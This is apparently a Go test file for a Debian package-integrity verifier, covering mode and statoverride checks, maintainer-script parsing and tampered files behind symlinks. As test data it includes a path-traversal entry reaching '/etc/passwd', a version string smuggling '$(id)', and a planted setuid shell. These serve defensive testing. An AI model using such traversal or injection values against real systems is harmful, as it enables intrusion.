	wantPaths(t, "Mismatch", res.Mismatch)
	wantPaths(t, "Suspicious", res.Suspicious, "/usr/bin/crontab", "/usr/bin/tool", libDir+"/libtool.so.1")
	for p, want := range map[string]string{
		"/usr/bin/tool":          "privilege granted by a local statoverride: deb 0755, disk 4755",
		libDir + "/libtool.so.1": "privilege granted by a local statoverride: deb 0644, disk 0666",
		"/usr/bin/crontab":       "privilege granted by a local statoverride: deb 0755, disk 2755",
	} {
		if v, _ := find(res.Suspicious, p); v.Reason != want || v.Kind != KindStatOverride || v.Expected == "" || v.Actual != v.Expected {
			t.Errorf("%s: %+v, want reason %q", p, v, want)
		}
	}
	if v, ok := find(res.Verified, "/usr/bin/chfn"); !ok || v.Reason != "mode differs (less permissive): deb 4755, disk 0755" {
		t.Errorf("chfn: %+v (found %v)", v, ok)
	}
}

func TestVerifyUnsupportedArchitectures(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)
	c.Packages.Installed = append(c.Packages.Installed, model.Package{Name: "odd", Version: "1", Arch: "../../x", Status: "install ok installed", Files: []string{"/usr/bin/odd"}})
	withFile(c, regular("/usr/bin/odd", "odd\n", 0o755))
	res := Verify(context.Background(), c, f.opts())
	if v, ok := find(res.Unverifiable, "/usr/bin/odd"); !ok || !strings.Contains(v.Reason, "unsupported architecture") {
		t.Errorf("Unverifiable = %+v", res.Unverifiable)
	}
	for _, p := range f.srv.hitPaths() {
		if strings.Contains(p, "..") || strings.Contains(p, "odd") {
			t.Errorf("requested %s", p)
		}
	}
	wantPaths(t, "Verified", res.Verified, "/usr/bin/tool", "/usr/bin/toolctl", libDir+"/libtool.so.1")

	c = toolCollection(nil)
	c.Host.Arch = "s390x"
	res = Verify(context.Background(), c, f.opts())
	if len(res.Unverifiable) != 4 || !strings.Contains(strings.Join(res.Errors, "\n"), "architecture") {
		t.Errorf("unverifiable %+v, errors %q", res.Unverifiable, res.Errors)
	}
}

func TestVerifyFetchesEachReleaseOnce(t *testing.T) {
	f := toolFixture(t)
	// Components and architectures the Release does not list cost nothing
	// more than the one InRelease download per suite.
	f.archives[0].Components = []string{"main", "contrib", "non-free"}
	c := toolCollection(nil)
	c.Packages.Installed = append(c.Packages.Installed, model.Package{Name: "lib32", Version: "1", Arch: "i386", Status: "install ok installed", Files: []string{"/usr/lib/i386-linux-gnu/lib32.so.1"}})
	withFile(c, regular("/usr/lib/i386-linux-gnu/lib32.so.1", "lib\n", 0o644))
	Verify(context.Background(), c, f.opts())
	for _, s := range []string{"bookworm", "bookworm-updates"} {
		if n := f.srv.hitCount("/debian/dists/" + s + "/InRelease"); n != 1 {
			t.Errorf("%s InRelease fetched %d times", s, n)
		}
	}
}

func TestVerifyProReasonOnlyForESMVersions(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)
	c.Packages.Installed[0].Version = "9.9"
	c.Packages.Sources = []model.AptSource{{Types: []string{"deb"}, URIs: []string{"https://esm.ubuntu.com/infra/ubuntu"}, Suites: []string{"noble-infra-security"}, Components: []string{"main"}}}
	res := Verify(context.Background(), c, f.opts())
	if len(res.Unverifiable) == 0 || res.Unverifiable[0].Reason != "package not found in the official archive; source not trusted: https://esm.ubuntu.com/infra/ubuntu" {
		t.Errorf("Unverifiable = %+v", res.Unverifiable)
	}
}

func TestVerifyOfflineDoesNotFollowSymlinks(t *testing.T) {
	root := t.TempDir()
	elsewhere := t.TempDir()
	disk := toolDisk(nil)
	for p, body := range disk {
		base := root
		if strings.HasPrefix(p, "/usr/lib/") {
			base = elsewhere // reached only through a symlinked directory
		}
		full := filepath.Join(base, p)
		os.MkdirAll(filepath.Dir(full), 0o755)
		os.WriteFile(full, []byte(body), 0o644)
	}
	os.MkdirAll(filepath.Join(root, "usr"), 0o755)
	if err := os.Symlink(filepath.Join(elsewhere, "usr", "lib"), filepath.Join(root, "usr", "lib")); err != nil {
		t.Fatal(err)
	}
	// A hostile collection naming a path that climbs out of the root.
	pkg := toolPackage()
	pkg.Files = append(pkg.Files, "/../../etc/passwd")
	pkg.LocalMD5["/../../etc/passwd"] = md5hex("x")
	c := withFile(collectionOf(disk, pkg), model.FileEntry{Path: "/../../etc/passwd", Type: "file", Mode: 0o100755})
	res := Verify(context.Background(), c, Options{Offline: true, Root: root})
	for _, p := range []string{libDir + "/libtool.so.1", "/../../etc/passwd"} {
		if v, ok := find(res.Unverifiable, p); !ok || !strings.Contains(v.Reason, "could not read") {
			t.Errorf("%s: Unverifiable = %+v", p, res.Unverifiable)
		}
	}
	wantPaths(t, "Verified", res.Verified, "/usr/bin/tool", "/usr/bin/toolctl")
}

// postinstModes is the idiom Debian's fuse3 and openssh-client use: set the
// mode in the maintainer script unless the admin has a statoverride.
const postinstModes = `#!/bin/sh
set -e
if [ "$1" = configure ]; then
	if ! dpkg-statoverride --list /usr/bin/agent >/dev/null; then
		chgrp _ssh /usr/bin/agent
		chmod 2755 /usr/bin/agent
	fi
	if ! dpkg-statoverride --list /bin/fusermount >/dev/null 2>&1; then chmod 4755 "/bin/fusermount"; fi
	setcap cap_net_raw+ep /bin/ping || chmod u+s /bin/ping
	chmod -R 0700 /var/lib/agent
	chmod 4755 "$f"
	chmod 4755 /usr/bin/oth*
	chmod 4755 /usr/bin/{other,x}
	chmod $MODE /usr/bin/other
	chmod 4755 "${PREFIX}/usr/bin/other"
	chmod 4755 $(which other) /usr/bin/other2
	chmod 4750 /usr/bin/quiet 2>/dev/null || true
	chmod 2750 -- /usr/bin/dashed
	chmod 4711 /usr/bin/both >/dev/null 2>&1
	dpkg-statoverride --update --add root crontab 2755 /usr/bin/crontab
	dpkg-statoverride --quiet --add root "mail" 2755 '/usr/sbin/sendmail' || true
	dpkg-statoverride --update --add root $GROUP 2755 /usr/bin/other
	dpkg-statoverride --add root root 4755 /usr/bin/oth*
	dpkg-statoverride --list /usr/bin/agent
	dpkg-statoverride --remove /usr/bin/other2
fi
`

func TestDebFilesScriptModes(t *testing.T) {
	deb := buildDebScript(t, "xz", nil, postinstModes, []debEntry{
		{name: "./usr/bin/agent", body: "agent\n", mode: 0o755},
		{name: "./usr/bin/fusermount", body: "fuse\n", mode: 0o755},
		{name: "./usr/bin/ping", body: "ping\n", mode: 0o755},
		{name: "./usr/bin/other", body: "other\n", mode: 0o755},
		{name: "./usr/bin/other2", body: "other2\n", mode: 0o755},
		{name: "./usr/bin/quiet", body: "q\n", mode: 0o755},
		{name: "./usr/bin/dashed", body: "d\n", mode: 0o755},
		{name: "./usr/bin/both", body: "b\n", mode: 0o755},
		{name: "./usr/bin/crontab", body: "c\n", mode: 0o755},
		{name: "./usr/sbin/sendmail", body: "s\n", mode: 0o755},
	})
	files, err := DebFiles(bytes.NewReader(deb), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	for p, want := range map[string][]uint32{
		"/usr/bin/agent":      {0o2755},
		"/usr/bin/fusermount": {0o4755}, // named by its merged-/usr alias
		"/usr/bin/ping":       {0o4755}, // u+s on the packaged 0755
		"/usr/bin/other":      nil,      // only computed or globbed chmods name it
		"/usr/bin/other2":     nil,      // in a chmod that also has a computed argument
		"/usr/bin/quiet":      {0o4750}, // a redirection and "|| true" do not matter
		"/usr/bin/dashed":     {0o2750}, // "chmod MODE -- PATH"
		"/usr/bin/both":       {0o4711},
	} {
		if got := files[p].ScriptModes; !slices.Equal(got, want) {
			t.Errorf("%s: ScriptModes = %o, want %o", p, got, want)
		}
	}
	for p, want := range map[string][]ScriptOverride{
		"/usr/bin/crontab":    {{Owner: "root", Group: "crontab", Mode: 0o2755}},
		"/usr/sbin/sendmail":  {{Owner: "root", Group: "mail", Mode: 0o2755}},
		"/usr/bin/other":      nil, // a variable group
		"/usr/bin/other2":     nil, // --remove, --list
		"/usr/bin/agent":      nil,
		"/usr/bin/fusermount": nil,
	} {
		if got := files[p].ScriptOverrides; !slices.Equal(got, want) {
			t.Errorf("%s: ScriptOverrides = %+v, want %+v", p, got, want)
		}
	}
}

func TestVerifyModeSetByMaintainerScript(t *testing.T) {
	deb := buildDebScript(t, "xz", nil, postinstModes, []debEntry{{name: "./usr/bin/agent", body: "agent\n", mode: 0o755}})
	f := newFixture(t, map[string][]fakePkg{"bookworm": {{"agent", "1", "amd64", deb}}})
	pkg := model.Package{Name: "agent", Version: "1", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/agent"}}
	for _, c := range []struct {
		mode     uint32
		override uint32
		want     string // "" verified, else the mismatch reason
	}{
		{0o2755, 0, ""},
		{0o755, 0, ""}, // the packaged mode, before the script runs
		{0o775, 0, "mode differs: deb 0755 (maintainer script sets 2755), disk 0775"},
		{0o4755, 0, "mode differs: deb 0755 (maintainer script sets 2755), disk 4755"},
		// A statoverride replaces what the script would set.
		{0o755, 0o755, ""},
		{0o2755, 0o755, "mode differs: statoverride 0755, disk 2755"},
	} {
		col := withFile(collectionOf(map[string]string{}, pkg), model.FileEntry{Path: "/usr/bin/agent", Type: "file", SHA256: sha256hex([]byte("agent\n")), Mode: 0o100000 | c.mode})
		if c.override != 0 {
			col.Packages.StatOverrides = []model.StatOverride{{Path: "/usr/bin/agent", Owner: "root", Group: "root", Mode: c.override}}
		}
		res := Verify(context.Background(), col, f.opts())
		if c.want == "" {
			if len(res.Verified) != 1 || len(res.Mismatch) != 0 {
				t.Errorf("mode %o override %o: verified %+v, mismatch %+v", c.mode, c.override, res.Verified, res.Mismatch)
			}
		} else if len(res.Mismatch) != 1 || res.Mismatch[0].Reason != c.want {
			t.Errorf("mode %o override %o: mismatch %+v, want %q", c.mode, c.override, res.Mismatch, c.want)
		}
	}
}

func TestDebFilesBackslashNames(t *testing.T) {
	// systemd escapes unit names: Ubuntu's systemd ships
	// system-systemd\x2dcryptsetup.slice with a literal backslash.
	name := `/usr/lib/systemd/system/system-systemd\x2dcryptsetup.slice`
	deb := buildDeb(t, "zst", nil, []debEntry{{name: "." + name, body: "[Unit]\n", mode: 0o644}})
	files, err := DebFiles(bytes.NewReader(deb), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	if f, ok := files[name]; !ok || f.SHA256 != sha256hex([]byte("[Unit]\n")) {
		t.Fatalf("files = %v", files)
	}
	// The cached table keeps such names too.
	dir := t.TempDir()
	storeTable(dir, strings.Repeat("ab", 32), files)
	if got, ok := loadTable(dir, strings.Repeat("ab", 32)); !ok || got[name].SHA256 != files[name].SHA256 {
		t.Errorf("cached table: %v %v", got, ok)
	}
}

func TestModeDiff(t *testing.T) {
	s := &session{overrides: map[string]model.StatOverride{
		"/usr/bin/crontab": {Path: "/usr/bin/crontab", Owner: "root", Group: "crontab", Mode: 0o2755},
		"/usr/bin/chfn":    {Path: "/usr/bin/chfn", Owner: "root", Group: "root", Mode: 0o755},
		"/usr/bin/y":       {Path: "/usr/bin/y", Owner: "root", Group: "root", Mode: 0o750},
		"/usr/bin/agent2":  {Path: "/usr/bin/agent2", Owner: "root", Group: "_ssh", Mode: 0o2755},
	}}
	const V, M, S = verdictVerified, verdictMismatch, verdictSuspicious
	cronScript := []ScriptOverride{{Owner: "root", Group: "crontab", Mode: 0o2755}}
	for _, c := range []struct {
		path   string
		disk   uint32
		deb    DebFile
		reason string
		kind   verdictKind
	}{
		{"/usr/bin/x", 0o100755, DebFile{Mode: 0o755}, "", V},
		// Added privilege: setuid, setgid, sticky, group or other write.
		{"/usr/bin/x", 0o104755, DebFile{Mode: 0o755}, "mode differs: deb 0755, disk 4755", M},
		{"/usr/bin/x", 0o102755, DebFile{Mode: 0o755}, "mode differs: deb 0755, disk 2755", M},
		{"/usr/bin/x", 0o101755, DebFile{Mode: 0o755}, "mode differs: deb 0755, disk 1755", M},
		{"/usr/bin/x", 0o100775, DebFile{Mode: 0o755}, "mode differs: deb 0755, disk 0775", M},
		{"/usr/share/x", 0o100666, DebFile{Mode: 0o644}, "mode differs: deb 0644, disk 0666", M},
		// Swapping setuid for setgid still adds a bit.
		{"/usr/bin/x", 0o102755, DebFile{Mode: 0o4755}, "mode differs: deb 4755, disk 2755", M},
		// Only removed bits: noted.
		{"/usr/bin/x", 0o100755, DebFile{Mode: 0o4755}, "mode differs (less permissive): deb 4755, disk 0755", V},
		{"/usr/bin/x", 0o100700, DebFile{Mode: 0o755}, "mode differs (less permissive): deb 0755, disk 0700", V},
		// Bits that grant nothing to others (owner write, execute) are
		// noted too.
		{"/usr/share/x", 0o100755, DebFile{Mode: 0o644}, "mode differs: deb 0644, disk 0755", V},
		// Maintainer-script modes.
		{"/usr/bin/agent", 0o102755, DebFile{Mode: 0o755, ScriptModes: []uint32{0o2755}}, "", V},
		{"/usr/bin/agent", 0o100755, DebFile{Mode: 0o755, ScriptModes: []uint32{0o2755}}, "", V},
		{"/usr/bin/agent", 0o104755, DebFile{Mode: 0o755, ScriptModes: []uint32{0o2755}}, "mode differs: deb 0755 (maintainer script sets 2755), disk 4755", M},
		{"/usr/bin/agent", 0o100711, DebFile{Mode: 0o755, ScriptModes: []uint32{0o2755}}, "mode differs (less permissive): deb 0755, disk 0711", V},
		{"/usr/bin/agent", 0o100755, DebFile{Mode: 0o4755, ScriptModes: []uint32{0o2755}}, "mode differs (less permissive): deb 4755, disk 0755", V},
		// A local statoverride that grants privilege the package never
		// gives: only the machine's own data explains the mode.
		{"/usr/bin/crontab", 0o102755, DebFile{Mode: 0o755}, "privilege granted by a local statoverride: deb 0755, disk 2755", S},
		{"/usr/bin/crontab", 0o100755, DebFile{Mode: 0o755}, "", V},
		{"/usr/bin/crontab", 0o106755, DebFile{Mode: 0o755}, "mode differs: deb 0755, disk 6755", M},
		{"/usr/bin/crontab", 0o102755, DebFile{Mode: 0o755, ScriptOverrides: []ScriptOverride{{Owner: "root", Group: "root", Mode: 0o2755}}}, "privilege granted by a local statoverride: deb 0755, disk 2755", S},
		// ... unless the package's own maintainer script adds exactly it.
		{"/usr/bin/crontab", 0o102755, DebFile{Mode: 0o755, ScriptOverrides: cronScript}, "", V},
		{"/usr/bin/crontab", 0o100755, DebFile{Mode: 0o755, ScriptOverrides: cronScript}, "mode differs (less permissive): statoverride 2755, disk 0755", V},
		{"/usr/bin/crontab", 0o106755, DebFile{Mode: 0o755, ScriptOverrides: cronScript}, "mode differs: statoverride 2755, disk 6755", M},
		// ... or a postinst chmod already gives that privilege.
		{"/usr/bin/agent2", 0o102755, DebFile{Mode: 0o755, ScriptModes: []uint32{0o2755}}, "", V},
		// A statoverride that removes privilege is fine; the mode is
		// then what it says.
		{"/usr/bin/chfn", 0o100755, DebFile{Mode: 0o4755}, "mode differs (less permissive): deb 4755, disk 0755", V},
		{"/usr/bin/chfn", 0o104755, DebFile{Mode: 0o4755}, "mode differs: statoverride 0755, disk 4755", M},
		{"/usr/bin/y", 0o100750, DebFile{Mode: 0o755}, "mode differs (less permissive): deb 0755, disk 0750", V},
	} {
		reason, kind := s.modeDiff(c.path, c.disk, c.deb)
		if reason != c.reason || kind != c.kind {
			t.Errorf("%s disk %o deb %+v: got %q %v, want %q %v", c.path, c.disk, c.deb, reason, kind, c.reason, c.kind)
		}
	}
}

func TestModeDiffPrefersExactScriptMode(t *testing.T) {
	s := &session{overrides: map[string]model.StatOverride{}}
	if r, kind := s.modeDiff("/usr/bin/x", 0o100711, DebFile{Mode: 0o755, ScriptModes: []uint32{0o711}}); r != "" || kind != verdictVerified {
		t.Errorf("got %q %v, want an exact match with the script's mode", r, kind)
	}
}

// onlyPathsFixture serves tool and an unrelated package, so a test can tell
// whether every installed package was fetched (the fallback) or not.
func onlyPathsFixture(t *testing.T) (*fixture, string) {
	t.Helper()
	other := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/otherbin", body: "other\n", mode: 0o755}})
	f := newFixture(t, map[string][]fakePkg{"bookworm": {{"tool", "1.0-1", "amd64", toolDeb(t, "xz")}, {"other", "1", "amd64", other}}})
	return f, "/debian/" + poolName(fakePkg{"other", "1", "amd64", nil})
}

func onlyPathsCollection(tool model.Package, extra ...model.Package) *model.Collection {
	other := model.Package{Name: "other", Version: "1", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/otherbin"}}
	return collectionOf(toolDisk(map[string]string{"/usr/bin/tool": "evil\n", "/usr/bin/otherbin": "other\n"}), append([]model.Package{tool, other}, extra...)...)
}

func TestVerifyOnlyPathsHiddenOwner(t *testing.T) {
	trimmed := toolPackage()
	trimmed.Files = []string{"/usr/share/doc/tool/README"}
	moved := toolPackage()
	moved.Files = slices.DeleteFunc(moved.Files, func(s string) bool { return s == "/usr/bin/tool" })
	helper := model.Package{Name: "aaa-helper", Version: "1.0", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/tool"}}
	changed := map[string]bool{"/usr/bin/tool": true}

	t.Run("trimmed list, warm cache: the cached table places the file", func(t *testing.T) {
		f, otherDeb := onlyPathsFixture(t)
		cache := t.TempDir()
		warm := f.opts()
		warm.CacheDir = cache
		Verify(context.Background(), toolCollection(nil), warm) // caches tool's table only
		toolDebPath := "/debian/" + poolName(fakePkg{"tool", "1.0-1", "amd64", nil})
		before := f.srv.hitCount(toolDebPath)

		opt := warm
		opt.OnlyPaths = changed
		res := Verify(context.Background(), onlyPathsCollection(trimmed), opt)
		wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
		if m, _ := find(res.Mismatch, "/usr/bin/tool"); m.Package != "tool" {
			t.Errorf("mismatch %+v", m)
		}
		if n := f.srv.hitCount(toolDebPath) - before; n != 0 {
			t.Errorf("tool's .deb fetched %d times; the cached table should have placed the file", n)
		}
		if n := f.srv.hitCount(otherDeb); n != 0 {
			t.Errorf("fell back to every package (other's .deb fetched %d times)", n)
		}
	})
	t.Run("trimmed list, no cache: falls back to every package", func(t *testing.T) {
		f, otherDeb := onlyPathsFixture(t)
		opt := f.opts()
		opt.OnlyPaths = changed
		res := Verify(context.Background(), onlyPathsCollection(trimmed), opt)
		wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
		if f.srv.hitCount(otherDeb) != 1 {
			t.Errorf("other's .deb fetched %d times, want the fallback to fetch it", f.srv.hitCount(otherDeb))
		}
		// Only the changed path is judged.
		wantPaths(t, "Verified", res.Verified)
	})
	t.Run("path moved to a fake package's list, no cache", func(t *testing.T) {
		f, _ := onlyPathsFixture(t)
		opt := f.opts()
		opt.OnlyPaths = changed
		res := Verify(context.Background(), onlyPathsCollection(moved, helper), opt)
		wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
		wantPaths(t, "Unverifiable", res.Unverifiable)
	})
	t.Run("changed file that is nobody's: fallback, then left to the judge", func(t *testing.T) {
		f, _ := onlyPathsFixture(t)
		opt := f.opts()
		opt.OnlyPaths = map[string]bool{"/usr/local/bin/mine": true}
		c := withFile(onlyPathsCollection(toolPackage()), regular("/usr/local/bin/mine", "mine\n", 0o755))
		res := Verify(context.Background(), c, opt)
		if n := len(res.Verified) + len(res.Mismatch) + len(res.Unverifiable) + len(res.Suspicious); n != 0 {
			t.Errorf("%d verdicts for an unowned file", n)
		}
	})
}

// dbusPostinst is Debian dbus 1.16.2-2's: the override goes through
// variables set once at the top of the script.
const dbusPostinst = `#!/bin/sh
set -e

MESSAGEUSER=messagebus
LAUNCHER=/usr/lib/dbus-1.0/dbus-daemon-launch-helper
TWICE=/usr/bin/a
ONCEINDENTED=/usr/bin/b
READ=/usr/bin/c

if [ "$1" = configure ]; then
    if ! dpkg-statoverride --list "$LAUNCHER" >/dev/null; then
        dpkg-statoverride --update --add root "$MESSAGEUSER" 4754 "$LAUNCHER"
    fi
    TWICE=/usr/bin/elsewhere
    dpkg-statoverride --update --add root root 4755 "$TWICE"
      INDENTED=/usr/bin/b
    dpkg-statoverride --update --add root root 4755 "$INDENTED"
    read READ < /etc/somewhere
    chmod 4755 "$READ"
    chmod 4755 "${LAUNCHER}x"
    chmod 4711 "${LAUNCHER}"
fi
`

func TestDebFilesScriptConstants(t *testing.T) {
	deb := buildDebScript(t, "xz", nil, dbusPostinst, []debEntry{
		{name: "./usr/lib/dbus-1.0/dbus-daemon-launch-helper", body: "h\n", mode: 0o755},
		{name: "./usr/bin/a", body: "a\n", mode: 0o755},
		{name: "./usr/bin/b", body: "b\n", mode: 0o755},
		{name: "./usr/bin/c", body: "c\n", mode: 0o755},
	})
	files, err := DebFiles(bytes.NewReader(deb), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	helper := files["/usr/lib/dbus-1.0/dbus-daemon-launch-helper"]
	if want := []ScriptOverride{{Owner: "root", Group: "messagebus", Mode: 0o4754}}; !slices.Equal(helper.ScriptOverrides, want) {
		t.Errorf("helper ScriptOverrides = %+v, want %+v", helper.ScriptOverrides, want)
	}
	if want := []uint32{0o4711}; !slices.Equal(helper.ScriptModes, want) {
		t.Errorf("helper ScriptModes = %o, want %o (only the whole-word ${LAUNCHER})", helper.ScriptModes, want)
	}
	for _, p := range []string{"/usr/bin/a", "/usr/bin/b", "/usr/bin/c", "/usr/bin/elsewhere"} {
		if f := files[p]; f.ScriptOverrides != nil || f.ScriptModes != nil {
			t.Errorf("%s: %+v; a variable assigned twice, indented or read is not a constant", p, f)
		}
	}
}

// Every unverifiable verdict carries a kind, so callers can tell a version
// no trusted source has from a source that could not be used without
// reading the human-readable reason.
func TestVerifyUnverifiableKinds(t *testing.T) {
	check := func(t *testing.T, res *Result, want string) {
		t.Helper()
		if len(res.Unverifiable) == 0 {
			t.Fatalf("no unverifiable verdicts")
		}
		for _, v := range res.Unverifiable {
			if v.Kind != want {
				t.Errorf("%s: kind %q, want %q (reason %q)", v.Path, v.Kind, want, v.Reason)
			}
		}
	}
	t.Run("archive down", func(t *testing.T) {
		f := toolFixture(t)
		f.srv.setDown(true)
		check(t, Verify(context.Background(), toolCollection(nil), f.opts()), KindUnreachable)
	})
	t.Run("package hash mismatch", func(t *testing.T) {
		// The index was read, so this package is unconfirmed; the HASH
		// MISMATCH itself is reported in Errors.
		f := toolFixture(t)
		f.srv.set("/debian/"+poolName(fakePkg{"tool", "1.0-1", "amd64", nil}), []byte("not the signed package"))
		res := Verify(context.Background(), toolCollection(nil), f.opts())
		check(t, res, KindNotFound)
		if len(res.Errors) == 0 || !strings.HasPrefix(res.Errors[0], "HASH MISMATCH") {
			t.Errorf("Errors = %q", res.Errors)
		}
	})
	t.Run("pro", func(t *testing.T) {
		f := toolFixture(t)
		c := toolCollection(nil)
		c.Packages.Installed[0].Version = "1.0-1+esm1"
		check(t, Verify(context.Background(), c, f.opts()), KindPro)
	})
	t.Run("not found", func(t *testing.T) {
		f := toolFixture(t)
		c := toolCollection(nil)
		c.Packages.Installed[0].Version = "1.0-9"
		check(t, Verify(context.Background(), c, f.opts()), KindNotFound)
	})
	t.Run("unsupported release", func(t *testing.T) {
		c := toolCollection(nil)
		c.Host.OSVersionID = "10"
		check(t, Verify(context.Background(), c, Options{}), KindRelease)
	})
	t.Run("package architecture", func(t *testing.T) {
		f := toolFixture(t)
		c := toolCollection(nil)
		c.Packages.Installed[0].Arch = "mips64el"
		check(t, Verify(context.Background(), c, f.opts()), KindUnsupportedArch)
	})
	t.Run("cancelled before it started", func(t *testing.T) {
		f := toolFixture(t)
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		check(t, Verify(ctx, toolCollection(nil), f.opts()), KindStopped)
	})
	t.Run("deadline during the package checks", func(t *testing.T) {
		f := toolFixture(t)
		c := toolCollection(nil)
		s := newSession(c, f.opts(), &Result{})
		r := &pkgResult{pkg: &c.Packages.Installed[0]}
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		s.onePackage(ctx, r)
		if r.kind != KindStopped {
			t.Errorf("kind %q, want %q", r.kind, KindStopped)
		}
	})
	// With the host's own signed indexes read, any per-package lookup
	// failure is "no trusted source has it": the snapshot service's errors
	// (a root-written 9 KB version gets HTTP 414) never fold.
	for _, tc := range []struct {
		name, version string
		status        int
	}{
		{"snapshot service error", "1.0-9", http.StatusServiceUnavailable},
		{"snapshot service 414 for a long version", "1.0-9" + strings.Repeat("a", 9000), http.StatusRequestURITooLong},
		{"version with characters Debian does not allow", "1.0-9;$(id)", http.StatusNotFound},
	} {
		t.Run(tc.name, func(t *testing.T) {
			snap := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				http.Error(w, "no", tc.status)
			}))
			defer snap.Close()
			f := toolFixture(t)
			f.old.DebianSnapshot = snap.URL
			f.old.Client = snap.Client()
			c := toolCollection(nil)
			c.Packages.Installed[0].Version = tc.version
			check(t, Verify(context.Background(), c, f.opts()), KindNotFound)
		})
	}
}

func TestPkgverifyExtraPaths(t *testing.T) {
	f := toolFixture(t)
	const readme = "/usr/share/doc/tool/README"
	c := toolCollection(map[string]string{readme: "changed\n"})
	opt := f.opts()

	// Not executable, not a library: outside the default scope.
	res := Verify(context.Background(), c, opt)
	wantPaths(t, "default Mismatch", res.Mismatch)

	// ExtraPaths adds it to the default scope.
	opt.ExtraPaths = []string{readme}
	res = Verify(context.Background(), c, opt)
	wantPaths(t, "extra Mismatch", res.Mismatch, readme)

	// And it is also checked when OnlyPaths limits the check.
	opt.OnlyPaths = map[string]bool{}
	res = Verify(context.Background(), c, opt)
	wantPaths(t, "only+extra Mismatch", res.Mismatch, readme)
}

// The package lists /bin/toolctl; this merged-/usr machine collects it at
// /usr/bin/toolctl. ExtraPaths names the collected spelling.
func TestPkgverifyExtraPathsMergedUsrAlias(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(map[string]string{"/usr/bin/toolctl": "evil\n"})
	opt := f.opts()
	opt.OnlyPaths = map[string]bool{}
	res := Verify(context.Background(), c, opt)
	wantPaths(t, "without extra", res.Mismatch)
	opt.ExtraPaths = []string{"/usr/bin/toolctl"}
	res = Verify(context.Background(), c, opt)
	wantPaths(t, "with extra", res.Mismatch, "/usr/bin/toolctl")
}

// movedLib is the tool machine after root moved the library directory away
// and left a link in its place: dpkg still lists the library under the old
// path, and the file a program loads is the one behind the link.
func movedLib(to, body string, perm uint32, extra ...model.FileEntry) *model.Collection {
	disk := toolDisk(nil)
	delete(disk, libDir+"/libtool.so.1")
	c := collectionOf(disk, toolPackage())
	dir := func(p string) model.FileEntry { return model.FileEntry{Path: p, Type: "dir", Mode: 0o40755} }
	c.Files = append(c.Files, dir("/usr"), dir("/usr/lib"), dir(path.Dir(to)), dir(to),
		symlinkEntry(libDir, to), regular(to+"/libtool.so.1", body, perm))
	c.Files = append(c.Files, extra...)
	return c
}

func TestVerifyFollowsAPackageDirectoryThatIsNowALink(t *testing.T) {
	f := toolFixture(t)
	const to = "/data/lib"
	const phys = to + "/libtool.so.1"

	// Moved by an admin, untouched: the file is verified where it is.
	res := Verify(context.Background(), movedLib(to, toolLib, 0o644), f.opts())
	if _, ok := find(res.Verified, phys); !ok {
		t.Errorf("an intact file behind a directory link: Verified %v, Mismatch %v", paths(res.Verified), paths(res.Mismatch))
	}

	// Replaced: compared with the package's file, never skipped.
	res = Verify(context.Background(), movedLib(to, "evil lib\n", 0o644), f.opts())
	if m, ok := find(res.Mismatch, phys); !ok || m.Kind != KindContentDiffers || m.Package != "tool" || m.Expected != sha256hex([]byte(toolLib)) {
		t.Errorf("a replaced file behind a directory link: Mismatch %+v", res.Mismatch)
	}

	// The package's content with a setuid bit added.
	res = Verify(context.Background(), movedLib(to, toolLib, 0o4755), f.opts())
	if m, ok := find(res.Mismatch, phys); !ok || m.Kind != KindModeAddsPrivilege {
		t.Errorf("a setuid bit behind a directory link: Mismatch %+v", res.Mismatch)
	}

	// A name added to the package's file list that the signed package does
	// not ship, planted behind the link.
	c := movedLib(to, toolLib, 0o644, regular(to+"/helper", "bash\n", 0o4755))
	c.Packages.Installed[0].Files = append(c.Packages.Installed[0].Files, libDir+"/helper")
	res = Verify(context.Background(), c, f.opts())
	if m, ok := find(res.Mismatch, to+"/helper"); !ok || m.Kind != KindNotShipped {
		t.Errorf("a listed, unshipped file behind a directory link: Mismatch %+v", res.Mismatch)
	}

	// With a snapshot the changed path may be named either way.
	for _, only := range []string{phys, libDir + "/libtool.so.1"} {
		opt := f.opts()
		opt.OnlyPaths = map[string]bool{only: true}
		res = Verify(context.Background(), movedLib(to, "evil lib\n", 0o644), opt)
		if _, ok := find(res.Mismatch, phys); !ok {
			t.Errorf("OnlyPaths %s: Mismatch %v", only, paths(res.Mismatch))
		}
	}
}

func TestVerifyOfflineFollowsAPackageDirectoryThatIsNowALink(t *testing.T) {
	const to = "/data/lib"
	const phys = to + "/libtool.so.1"
	for body, wantMismatch := range map[string]bool{toolLib: false, "evil lib\n": true} {
		root := t.TempDir()
		if err := os.MkdirAll(filepath.Join(root, to), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, phys), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		res := Verify(context.Background(), movedLib(to, body, 0o644), Options{Offline: true, Root: root})
		_, mis := find(res.Mismatch, phys)
		_, ver := find(res.Verified, phys)
		if mis != wantMismatch || ver == wantMismatch {
			t.Errorf("content %q: Verified %v, Mismatch %v, Unverifiable %v", body, paths(res.Verified), paths(res.Mismatch), paths(res.Unverifiable))
		}
	}
}
